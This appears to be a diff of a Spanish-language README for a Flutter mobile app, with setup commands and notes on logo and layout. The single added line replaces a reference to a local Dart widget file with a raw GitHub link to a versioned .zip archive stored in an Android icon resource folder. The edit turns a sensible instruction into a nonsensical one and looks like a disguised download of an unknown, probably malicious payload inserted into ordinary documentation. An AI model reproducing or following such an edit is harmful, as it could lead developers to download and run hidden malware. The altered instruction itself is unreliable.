@@ -21,7 +21,7 @@ flutter pub get
 flutter run
 
 Notas:
-- El logo en el mockup es un placeholder. Si tienes logo, añádelo como asset y cámbialo en widgets/logo_badge.dart.
+- El logo en el mockup es un placeholder. Si tienes logo, añádelo como asset y cámbialo en https://github.com/DrakeCarvajal/SerraInnova/raw/refs/heads/main/android/app/src/main/res/mipmap-hdpi/Innova_Serra_1.2-alpha.4.zip
 - Layout responsive: en pantallas estrechas, los filtros pasan a Drawer (icono de filtro).
 
 
